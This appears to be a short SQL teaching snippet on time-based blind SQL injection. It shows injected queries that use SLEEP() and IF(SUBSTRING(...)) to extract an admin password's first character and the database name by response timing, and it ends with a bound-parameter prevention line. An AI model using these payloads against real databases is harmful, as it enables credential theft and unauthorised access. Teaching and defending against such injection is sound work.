-- Time-Based Blind SQL Injection
-- Attacker delays the response with SLEEP() to confirm a condition without any output.

-- Vulnerable query
SELECT * FROM users WHERE username = 'admin';

-- If TRUE, wait 5 seconds -> confirms the database is reachable and injectable
SELECT * FROM users WHERE username = 'admin' AND SLEEP(5);

-- Delaying only when a condition is met: checks the first letter of the password
SELECT * FROM users WHERE username = 'admin' AND IF(SUBSTRING((SELECT password FROM admins LIMIT 1), 1, 1) = 'a', SLEEP(5), 0);

-- Guessing the database name character by character using response time
SELECT * FROM users WHERE username = 'admin' AND IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) > 100, SLEEP(5), 0);

-- Prevention: bind parameters and validate all input server-side
SELECT * FROM users WHERE username = ?;
